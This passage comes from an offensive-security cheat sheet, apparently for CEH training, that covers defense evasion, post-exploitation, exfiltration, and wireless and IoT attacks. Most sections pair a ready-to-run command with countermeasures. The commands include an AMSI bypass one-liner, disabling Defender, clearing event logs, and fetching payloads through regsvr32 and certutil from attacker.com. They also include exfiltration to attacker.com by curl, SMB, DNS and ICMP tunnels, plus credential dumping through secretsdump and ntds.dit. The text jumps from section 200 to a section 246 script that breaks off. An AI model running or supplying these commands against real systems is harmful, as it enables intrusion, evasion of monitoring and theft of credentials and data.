> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Bypasses local execution policy constraints. These policies are not security boundaries, but administrative checks.

### 💻 Command / Payload
```bash
powershell.exe -ExecutionPolicy Bypass -File script.ps1
# Or: powershell -nop -c "Get-Content script.ps1 | PowerShell -"
```

### 📋 Expected Output
PowerShell script executing successfully.

### 🛡️ Countermeasures
Configure execution policies via GPO. Implement AppLocker or Software Restriction Policies (SRP) to block untrusted executables entirely.

---

## Section 137: PowerShell AMSI Bypass via Memory Patching

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Patches the amsiInitFailed variable inside the AMSI interface in memory, preventing script scanning for the duration of the PowerShell process.

### 💻 Command / Payload
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

### 📋 Expected Output
Successful execution of previously flagged scripts without triggering alerts.

### 🛡️ Countermeasures
Implement PowerShell Constrained Language Mode. Enable script block logging and monitor for AMSI memory patching patterns.

---

## Section 138: PowerShell ETW Bypass via Memory Patching

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Patches memory locations in ntdll.dll responsible for Event Tracing for Windows (ETW), stopping event generation for monitoring tools.

### 💻 Command / Payload
```bash
# C# memory patching script to write ret (0xC3) to ntdll!EtwEventWrite
```

### 📋 Expected Output
Suppressed endpoint log creation for subsequent commands.

### 🛡️ Countermeasures
Deploy Kernel-mode EDR agents. Monitor process memory modification APIs (VirtualProtect).

---

## Section 139: Windows Defender Exclusion Path Modification

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Modifies antivirus preferences to exclude directories from real-time scans. Requires local administrator credentials.

### 💻 Command / Payload
```bash
powershell -command "Add-MpPreference -ExclusionPath 'C:\Users\Public'"
```

### 📋 Expected Output
Target directory excluded from Windows Defender scanning.

### 🛡️ Countermeasures
Enforce Tamper Protection. Restrict access to PowerShell cmdlet groups via AppLocker.

---

## Section 140: Windows Defender Service Disabling

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Disables the antivirus service to prevent host scanning. Requires administrative credentials and disabled Tamper Protection.

### 💻 Command / Payload
```bash
sc config WinDefend start= disabled
# Or modify registry: HKLM\SYSTEM\CurrentControlSet\Services\WinDefend\Start = 4
```

### 📋 Expected Output
Windows Defender antivirus services disabled.

### 🛡️ Countermeasures
Enable Windows Defender Tamper Protection. Enforce Group Policy controls over antivirus settings.

---

## Section 141: Windows Event Log Clearing (wevtutil)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Clears active event logs to remove traces of actions on compromised servers.

### 💻 Command / Payload
```bash
wevtutil cl Setup
wevtutil cl System
wevtutil cl Security
```

### 📋 Expected Output
Empty logs inside Event Viewer.

### 🛡️ Countermeasures
Forward logs to a SIEM in real-time. Alert on Event ID 1102 (audit log cleared).

---

## Section 142: Windows Event Log Service Suspension

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Suspends threads running the event log service (EventLog) to stop logging without triggering log clearing alerts.

### 💻 Command / Payload
```bash
# Suspend event log process threads using Process Explorer or custom PowerShell
```

### 📋 Expected Output
Log creation stopped on target system.

### 🛡️ Countermeasures
Monitor process thread states. Track access to services via SIEM platforms.

---

## Section 143: Process Injection via Classic CreateRemoteThread

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Allocates memory inside an external process, writes shellcode, and runs a remote thread to execute the payload.

### 💻 Command / Payload
```bash
# Executable compiled from C/C++ running VirtualAllocEx and CreateRemoteThread
```

### 📋 Expected Output
Command execution running under the context of the targeted process.

### 🛡️ Countermeasures
Enable EDR memory inspection. Restrict API calls (OpenProcess, VirtualAllocEx) using endpoint detection profiles.

---

## Section 144: Process Hollowing (RunPE)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Spins up a legitimate system process in a suspended state, replaces its memory space with a payload, and resumes execution to mask activity.

### 💻 Command / Payload
```bash
# Loader executing target binary in suspended state, unmapping, rewriting code, and resuming
```

### 📋 Expected Output
Payload running under a trusted system process name.

### 🛡️ Countermeasures
Analyze process parent-child relationships. Monitor suspended process creation APIs.

---

## Section 145: Process Ghosting Concept

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Uses transaction modifications to execute payloads from files that have been deleted, bypassing scanner hooks on new file creation.

### 💻 Command / Payload
```bash
# File modification and transaction deletion prior to execution
```

### 📋 Expected Output
Code execution running without file footprints.

### 🛡️ Countermeasures
Deploy kernel-level endpoint inspection engines. Restrict file locking APIs.

---

## Section 146: DLL Side-Loading

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Abuses dll loading priorities by placing a custom DLL next to a trusted executable that loads it, executing payload code automatically.

### 💻 Command / Payload
```bash
# Place malicious DLL with matching expected name next to trusted system binary
```

### 📋 Expected Output
Payload running inside a signed application context.

### 🛡️ Countermeasures
Configure strict folder access controls. Monitor file creations next to system binaries.

---

## Section 147: VBA Macro Obfuscation & Execution

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Uses character arrays and string modifications inside Office macros to bypass static inspection scans when opening documents.

### 💻 Command / Payload
```bash
# Injected VBA macro script using string concatenation and character arrays
```

### 📋 Expected Output
Command execution on file open.

### 🛡️ Countermeasures
Block macros in documents downloaded from the Internet. Enforce signed-macro policies.

---

## Section 148: MSHTA HTML Application (HTA) Payload Execution

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Uses mshta.exe to run VBScript or JScript payloads embedded inside HTML files, bypassing simple executable blocklists.

### 💻 Command / Payload
```bash
mshta vbscript:Close(Execute("CreateObject(\"WScript.Shell\").Run \"cmd.exe /c id\" "))
```

### 📋 Expected Output
Payload code running via the mshta system utility.

### 🛡️ Countermeasures
Disable mshta.exe execution via AppLocker. Restrict access to scripting interfaces.

---

## Section 149: InstallUtil Bypass Execution

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Uses signed Microsoft installer utilities to run custom executable code from uninstall triggers, bypassing application blocklists.

### 💻 Command / Payload
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Users\Public\payload.exe
```

### 📋 Expected Output
Command execution triggered via trusted binaries.

### 🛡️ Countermeasures
Block Microsoft system binaries like InstallUtil.exe from running for standard users using AppLocker.

---

## Section 150: MSBuild XML Project Payload Compilation & Run

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Uses the MSBuild build tool to compile and execute C# code embedded inside XML project configuration files.

### 💻 Command / Payload
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe project.xml
```

### 📋 Expected Output
Code compilation and execution running via MSBuild.

### 🛡️ Countermeasures
Restrict MSBuild.exe usage via AppLocker. Monitor for suspicious XML compilation runs.

---

## Section 151: Regsvr32 SCT payload execution (Squiblydoo)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Uses the regsvr32 utility to fetch and run remote scriptlet components, bypassing local application filters.

### 💻 Command / Payload
```bash
regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll
```

### 📋 Expected Output
Payload execution triggered via signed DLL handlers.

### 🛡️ Countermeasures
Block remote calls from regsvr32.exe. Enforce application control rules.

---

## Section 152: Rundll32 Control Panel Item (CPL) Payload Execution

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Uses rundll32 to load and run payload modules packaged as Control Panel items.

### 💻 Command / Payload
```bash
rundll32.exe shell32.dll,Control_RunDLL payload.cpl
```

### 📋 Expected Output
Payload execution running under the rundll32.exe process.

### 🛡️ Countermeasures
Monitor rundll32 executions. Restrict loading of untrusted CPL files.

---

## Section 153: Certutil Web Payload Downloading & Decoding

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Uses the certutil security utility to download remote files, bypassing network connection monitors on custom tools.

### 💻 Command / Payload
```bash
certutil -urlcache -split -f http://attacker.com/payload.txt C:\Users\Public\payload.exe
```

### 📋 Expected Output
Downloaded payload files located on the host disk.

### 🛡️ Countermeasures
Restrict certutil execution. Monitor certutil network connections via proxy logs.

---

## Section 154: PowerShell Command Obfuscation

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Uses base64 encoding to mask commands in PowerShell parameters, preventing basic string matching alerts.

### 💻 Command / Payload
```bash
powershell -enc aQBkAA==
```

### 📋 Expected Output
Obfuscated commands executing on the system.

### 🛡️ Countermeasures
Enable transcript logging. Scan logs for base64 parameter blocks.

---

## Section 155: WMI/WMIC Remote Payload Execution

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Uses WMI remote calls to execute processes on target machines.

### 💻 Command / Payload
```bash
wmic /node:<target> process call create 'C:\Users\Public\shell.exe'
```

### 📋 Expected Output
Process execution triggered on the remote system.

### 🛡️ Countermeasures
Restrict WMI remote namespace access. Block WMI ports at local firewalls.

---

## Section 156: Linux Auditd Log Service Disabling

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Disables the system audit daemon to stop logging of commands and file access events. Requires root credentials.

### 💻 Command / Payload
```bash
service auditd stop
# Or systemctl stop auditd
```

### 📋 Expected Output
Logging services stopped.

### 🛡️ Countermeasures
Forward audit logs to remote SIEM hosts in real-time. Alert on auditd service stoppages.

---

## Section 157: Linux Syslog File Deletion & Manipulation

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Deletes system log files to remove traces of SSH logins and shell commands.

### 💻 Command / Payload
```bash
rm -rf /var/log/syslog
# Or truncate logs: > /var/log/auth.log
```

### 📋 Expected Output
Empty log files on host.

### 🛡️ Countermeasures
Forward logs to remote SIEM systems. Restrict write access to log directories.

---

## Section 158: Linux Shared Library Injection (LD_PRELOAD)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Uses environment variables to preload custom shared libraries, hijacking system functions (like write or accept) to execute payloads.

### 💻 Command / Payload
```bash
export LD_PRELOAD=/tmp/hook.so
# Run target binary to trigger hook
```

### 📋 Expected Output
Payload code running whenever binaries execute.

### 🛡️ Countermeasures
Restrict access to LD_PRELOAD. Use static linking for security-critical binaries.

---

## Section 159: Linux Process Memory Dumping

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Dumps active memory structures of running processes using /proc filesystem parameters.

### 💻 Command / Payload
```bash
dd if=/proc/<PID>/mem of=/tmp/mem.dmp bs=1024
```

### 📋 Expected Output
Saved memory dump files containing variables and strings.

### 🛡️ Countermeasures
Restrict access to /proc filesystems. Enable security modules (SELinux/AppArmor).

---

## Section 160: Linux Kernel Module Rootkit Loader

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Loads kernel modules to intercept syscalls and hide processes, files, or network connections. Requires root credentials.

### 💻 Command / Payload
```bash
insmod rootkit.ko
```

### 📋 Expected Output
Hidden files and persistent kernel hooks.

### 🛡️ Countermeasures
Enable kernel module signing restrictions. Disable insmod/modprobe for unauthorized users.

---

# Phase 9: 📦 Post-Exploitation & Data Exfiltration

---

## Section 161: LSA Secrets Dumping (secretsdump.py)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Requests LSA credential secrets from domain controllers using remote synchronization protocols.

### 💻 Command / Payload
```bash
secretsdump.py <domain>/<user>:<pass>@<DC> -just-dc-user Administrator
```

### 📋 Expected Output
Credential hashes of target users.

### 🛡️ Countermeasures
Restrict DC replication rights. Enable credential guard policies.

---

## Section 162: NTDS.dit Active Directory Database Extraction (vssadmin)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Uses volume shadow copies to extract copy-locked AD database files containing all user credential structures.

### 💻 Command / Payload
```bash
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Users\Public
```

### 📋 Expected Output
Extracted copy of ntds.dit database.

### 🛡️ Countermeasures
Restrict access to DCs. Monitor vssadmin execution paths.

---

## Section 163: Browser Credential Extraction (SharpChromium)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Decrypts credential keys stored in browser configurations.

### 💻 Command / Payload
```bash
SharpChromium.exe logins
```

### 📋 Expected Output
Plaintext usernames, passwords, and target URLs.

### 🛡️ Countermeasures
Enable database file locking. Enforce credential protections at the OS level.

---

## Section 164: Wi-Fi Cleartext Password Recovery (netsh)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Extracts cleartext Wi-Fi passwords from saved configuration profiles.

### 💻 Command / Payload
```bash
netsh wlan show profile name='<SSID>' key=clear
```

### 📋 Expected Output
Plaintext wireless keys.

### 🛡️ Countermeasures
Disable cleartext credential storage for wireless profiles. Apply local system policies.

---

## Section 165: RDP Credential Extraction (vaultcmd)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Extracts credentials saved inside the Windows credential manager store.

### 💻 Command / Payload
```bash
vaultcmd.exe /list
```

### 📋 Expected Output
Saved user credentials and domain strings.

### 🛡️ Countermeasures
Disable credential caching policies for RDP connections.

---

## Section 166: Clipboard Text Monitoring & Sniffing

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Monitors clipboard state registers to capture copied passwords, URLs, or notes.

### 💻 Command / Payload
```bash
# PowerShell loop capturing clipboard state changes
```

### 📋 Expected Output
Clipboard strings logged to files.

### 🛡️ Countermeasures
Restrict access to desktop interface APIs. Monitor background processes.

---

## Section 167: Keylogger Implementation (Raw Input APIs)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Installs event hooks to log keyboard strokes to hidden system directories.

### 💻 Command / Payload
```bash
# Compiled background keylogger binary using SetWindowsHookEx
```

### 📋 Expected Output
Recorded keystrokes.

### 🛡️ Countermeasures
Monitor background API event hooks. Use endpoint defense rules.

---

## Section 168: Web Camera Video Capture (DirectShow APIs)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Captures camera streams using local hardware libraries.

### 💻 Command / Payload
```bash
# Custom PowerShell script loading DirectShow DLLs to record camera
```

### 📋 Expected Output
Captured video files saved to directories.

### 🛡️ Countermeasures
Disable system camera hardware when not required. Restrict driver accesses.

---

## Section 169: Microphone Audio Sniffing (MCI APIs)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Records microphone inputs using local system audio components.

### 💻 Command / Payload
```bash
# Custom C# script recording audio streams via MCI libraries
```

### 📋 Expected Output
Saved audio recordings.

### 🛡️ Countermeasures
Restrict audio hardware access permissions at the OS level.

---

## Section 170: Host Port Forwarding (netsh interface portproxy)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Creates local port redirections to proxy external traffic through compromised hosts to internal targets.

### 💻 Command / Payload
```bash
netsh interface portproxy add v4tov4 listenport=4444 listenaddress=0.0.0.0 connectport=80 connectaddress=<IP>
```

### 📋 Expected Output
Active port forward configurations.

### 🛡️ Countermeasures
Restrict netsh access. Monitor active listening port registrations.

---

## Section 171: SSH Dynamic Port Forwarding (SOCKS Proxy)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Establishes dynamic SOCKS proxies to route auditing traffic directly through target networks.

### 💻 Command / Payload
```bash
ssh -D 1080 -N -f user@<IP>
```

### 📋 Expected Output
Local SOCKS listener active on port 1080.

### 🛡️ Countermeasures
Disable SSH forwarding configurations. Monitor outbound SSH port connections.

---

## Section 172: Reverse SSH Tunneling

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Creates tunnels mapping target ports to attacker systems, bypassing inbound firewall constraints.

### 💻 Command / Payload
```bash
ssh -R 8080:localhost:80 -N -f user@attacker.com
```

### 📋 Expected Output
Inbound port tunnels active on remote systems.

### 🛡️ Countermeasures
Block outbound SSH access from internal hosts. Implement deep packet inspection.

---

## Section 173: DNS Tunneling Data Exfiltration (dnscat2)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Tunnels exfiltration payloads inside DNS query fields to bypass traditional firewall controls.

### 💻 Command / Payload
```bash
dnscat2 --dns domain=attacker.com
```

### 📋 Expected Output
Interception bypass, exfiltrated files received on attacker hosts.

### 🛡️ Countermeasures
Implement DNS payload limit filters. Monitor DNS request rate anomalies.

---

## Section 174: ICMP Tunneling Data Exfiltration (ptunnel)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Encapsulates traffic inside ICMP echo packets to bypass gateway blocklists.

### 💻 Command / Payload
```bash
ptunnel -p attacker.com -lp 8000 -da 80 -r <IP>
```

### 📋 Expected Output
Active connections routing via ICMP fields.

### 🛡️ Countermeasures
Block outbound ICMP traffic or inspect packet sizes.

---

## Section 175: HTTP/HTTPS Web-Based Data Exfiltration

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Uploads files to attacker web servers using HTTP POST requests.

### 💻 Command / Payload
```bash
curl -F 'file=@data.zip' http://attacker.com/upload
```

### 📋 Expected Output
Uploaded file datasets.

### 🛡️ Countermeasures
Implement proxy filtering. Limit upload capacities. Inspect payloads.

---

## Section 176: SMB Share Exfiltration

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Copies file datasets directly to external SMB shares.

### 💻 Command / Payload
```bash
copy data.zip \\attacker.com\share
```

### 📋 Expected Output
Copied files received on attacker shares.

### 🛡️ Countermeasures
Block outbound SMB traffic (port 445) at boundary firewalls.

---

## Section 177: Email-Based Data Exfiltration (SMTP/IMAP)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Mails target datasets to external addresses using local SMTP services.

### 💻 Command / Payload
```bash
sendmail -t < mail_body.txt
```

### 📋 Expected Output
Emailed data payloads.

### 🛡️ Countermeasures
Disable outbound mail relays. Monitor email logs for attachment limits.

---

## Section 178: Steganography Data Exfiltration (Steghide)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Hides target zip archives inside host image files to evade static network filters.

### 💻 Command / Payload
```bash
steghide embed -ef sensitive.zip -cf image.jpg -p 'password'
```

### 📋 Expected Output
Image files containing hidden zip archives.

### 🛡️ Countermeasures
Apply structural image checks. Scan files for anomaly patterns.

---

## Section 179: Linux Process Triage & Netstat Auditing

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Triages active process states and port listings to identify security indicators.

### 💻 Command / Payload
```bash
netstat -tulnp
ps aux
```

### 📋 Expected Output
Active network ports and processes mapped to system commands.

### 🛡️ Countermeasures
Run security baselines. Log active processes centrally.

---

## Section 180: Automated Host Artifact Collection (Snaffler)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Scans file shares to locate exposed passwords, keys, and credentials automatically.

### 💻 Command / Payload
```bash
Snaffler.exe -o snaffler.log -d domain.com
```

### 📋 Expected Output
Lists of located configuration parameters and keys.

### 🛡️ Countermeasures
Restrict file share access. Scan shares regularly for sensitive data.

---

# Phase 10: 📡 Cryptography, Wireless & IoT Security

---

## Section 181: WPA2 Handshake Capture & Cracking (aircrack-ng)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Captures WPA2 authentication handshakes and runs offline dictionary attacks to crack passwords.

### 💻 Command / Payload
```bash
airodump-ng -c 6 --bssid <BSSID> -w capture wlan0
# Deauth:
aireplay-ng -0 5 -a <BSSID> -c <CLIENT> wlan0
# Crack:
aircrack-ng -w wordlist.txt capture-01.cap
```

### 📋 Expected Output
Cracked Wi-Fi password.

### 🛡️ Countermeasures
Use WPA3. Use long, complex passwords. Implement enterprise authentication (802.1X).

---

## Section 182: WPA3 PMKID Capture & Offline Cracking

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Captures PMKID frames directly from router association requests without client connection dependencies, cracking passwords offline.

### 💻 Command / Payload
```bash
hcxdumptool -i wlan0 -o capture.pcapng --enable_status=1
# Convert:
hcxtools -o capture.16800 -p capture.pcapng
# Crack:
hashcat -m 16800 capture.16800 wordlist.txt
```

### 📋 Expected Output
Cracked WPA3 password keys.

### 🛡️ Countermeasures
Enable protected management frames (PMF) on WPA3 configurations. Use strong passwords.

---

## Section 183: WPS PIN Rogue Access Point Attack (Reaver)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Exploits WPS pin validation loops to brute-force security keys.

### 💻 Command / Payload
```bash
reaver -i wlan0 -b <BSSID> -vv
```

### 📋 Expected Output
Cracked WPA/WPA2 pre-shared keys.

### 🛡️ Countermeasures
Disable WPS on router configurations. Enable AP rate limits.

---

## Section 184: Wireless Evil Twin Access Point Setup (Hostapd-mana)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Deploys spoofed access points to intercept and hijack client connections.

### 💻 Command / Payload
```bash
# Start hostapd-mana using custom config files
```

### 📋 Expected Output
Credentials captured via fake captive portals or proxy endpoints.

### 🛡️ Countermeasures
Enforce client connection policies. Verify network names before connecting.

---

## Section 185: Bluetooth Device Reconnaissance & Service Scanning

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Scans for active Bluetooth devices to discover services and configurations.

### 💻 Command / Payload
```bash
hcitool scan
sdptool browse <MAC>
```

### 📋 Expected Output
List of Bluetooth MAC addresses and open services.

### 🛡️ Countermeasures
Configure devices as non-discoverable. Disable Bluetooth when unused.

---

## Section 186: Bluetooth Bluejacking & Bluesnarfing Concepts

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Exploits Bluetooth protocol configurations to inject messages or extract data from unpatched devices.

### 💻 Command / Payload
```bash
# Simulated bluetooth messaging scripts
```

### 📋 Expected Output
Transmitted messages or extracted target datasets.

### 🛡️ Countermeasures
Enforce pairing codes. Update Bluetooth device firmware versions.

---

## Section 187: RFID/NFC Badge Cloning (Proxmark3)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Reads and duplicates credentials from RFID/NFC entry badges.

### 💻 Command / Payload
```bash
lf hid clone --raw <ID>
```

### 📋 Expected Output
Cloned badges matching target device IDs.

### 🛡️ Countermeasures
Use encrypted RFID protocols (like Mifare DESFire). Enforce multi-factor controls.

---

## Section 188: Zigbee Smart Home Protocol Sniffing

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Sniffs Zigbee wireless fields to capture home automation signals.

### 💻 Command / Payload
```bash
whsniff -c 11
```

### 📋 Expected Output
Intercepted control commands.

### 🛡️ Countermeasures
Enable Zigbee packet encryption. Keep device keys secure.

---

## Section 189: RTL-SDR Sub-GHz Signal Replay (HackRF)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Records radio frequency packets (such as gate opener signals) and replays them to trigger actions.

### 💻 Command / Payload
```bash
# Record signal on 433MHz and replay
```

### 📋 Expected Output
Triggered physical gate actions.

### 🛡️ Countermeasures
Use rolling codes for RF transmitters. Implement transmission limits.

---

## Section 190: JTAG/UART Hardware Debug Port Access Concepts

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Connects directly to hardware debug ports to access terminal shells on IoT devices.

### 💻 Command / Payload
```bash
# Connection to hardware board using buspirate or FTDI
```

### 📋 Expected Output
Terminal console shell on the targeted hardware.

### 🛡️ Countermeasures
Disable hardware debug interfaces on production boards. Disable boot logging outputs.

---

## Section 191: Flash Memory Chip Dump via SPI interface

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Reads storage chips directly using SPI programmer hardware.

### 💻 Command / Payload
```bash
# Dump flash memory using flashrom utility
```

### 📋 Expected Output
Saved binary image files containing firmware datasets.

### 🛡️ Countermeasures
Encrypt flash storage contents. Disable external read interfaces.

---

## Section 192: Firmware Binary Analysis & Extraction (Binwalk)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Analyzes and extracts operating systems and files from firmware packages.

### 💻 Command / Payload
```bash
binwalk -e firmware.bin
```

### 📋 Expected Output
Extracted filesystems, config files, and credential hashes.

### 🛡️ Countermeasures
Obfuscate firmware images. Remove private keys and passwords before compilation.

---

## Section 193: Firmware Emulation & Exploit Testing (QEMU)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Emulates IoT CPU environments to test firmware files for vulnerabilities locally.

### 💻 Command / Payload
```bash
qemu-system-arm -M versatilepb -kernel zImage -hda rootfs.img
```

### 📋 Expected Output
Emulated hardware system running locally, exposing vulnerabilities.

### 🛡️ Countermeasures
Perform regular vulnerability assessments on firmware packages before release.

---

## Section 194: SSL/TLS Certificate Strength Auditing (testssl.sh)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Audits server SSL certificates to locate weak ciphers and protocol support.

### 💻 Command / Payload
```bash
testssl.sh <target>
```

### 📋 Expected Output
List of weak ciphers, expired certs, or insecure protocol support.

### 🛡️ Countermeasures
Enforce TLS 1.3 support. Disable legacy SSL/TLS versions. Use strong keys.

---

## Section 195: SSH Cipher Suite & Key Exchange Auditing

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Identifies weak key exchanges and encryption algorithms on SSH servers.

### 💻 Command / Payload
```bash
nmap -p 22 --script ssh2-enum-algos <IP>
```

### 📋 Expected Output
List of accepted SSH algorithms and key exchange groups.

### 🛡️ Countermeasures
Configure sshd_config to only allow strong MACs and key exchange algorithms.

---

## Section 196: Database Encryption Decoupling & Key Retrieval

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Retrieves keys from system memory to decrypt encrypted database tables.

### 💻 Command / Payload
```bash
# Query SQL tables to extract transparent data encryption keys
```

### 📋 Expected Output
Recovered encryption keys.

### 🛡️ Countermeasures
Manage keys using dedicated external HSM services. Restrict memory access.

---

## Section 197: Hashcat Rule-Based Custom Wordlist Generation

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Applies rule files to modify dictionary entries, generating targeted wordlist variations.

### 💻 Command / Payload
```bash
hashcat --force -r rules/best64.rule -o custom_wordlist.txt wordlist.txt
```

### 📋 Expected Output
Expanded custom wordlists.

### 🛡️ Countermeasures
Implement strong password requirements. Change defaults.

---

## Section 198: Password Vault Database Offline Auditing (KeePass)

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Converts KeePass database files to hashes and cracks them offline.

### 💻 Command / Payload
```bash
keepass2john database.kdbx > keepass_hash.txt
hashcat -m 13400 keepass_hash.txt wordlist.txt
```

### 📋 Expected Output
Cracked password database master keys.

### 🛡️ Countermeasures
Enforce complex master passwords. Use key files in combination with passwords.

---

## Section 199: BitLocker Encryption Key Extraction via TPM Sniffing

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Sniffs SPI lines using logic analyzers to capture BitLocker keys during boot.

### 💻 Command / Payload
```bash
# Extract key from logic analyzer capture files
```

### 📋 Expected Output
Recovered BitLocker encryption keys.

### 🛡️ Countermeasures
Enable BitLocker PIN authentication in combination with TPM verification.

---

## Section 200: GnuPG Private Key Export & Ring Auditing

> [!WARNING]
> **LAB-ONLY** — Do not use against any system without explicit written authorization.

### 🎯 Objective
Exports GPG secret keys for backup verification or offline auditing.

### 💻 Command / Payload
```bash
gpg --export-secret-keys -a <ID>
```

### 📋 Expected Output
Saved GPG private key files.

### 🛡️ Countermeasures
Secure private keys using hardware tokens. Protect keys with strong passwords.

---

## Section 246 : Advanced Nmap Enumeration Automation

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Advanced Nmap Enumeration Automation

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
﻿#!/usr/bin/env python3
# LAB-ONLY: Advanced Nmap Enumeration Automation
# CEH v13 Master Module 03,04
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
import subprocess
import sys
import json
from datetime import datetime

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_TARGET = "192.168.100.10"          # Change to YOUR lab target IP/CIDR
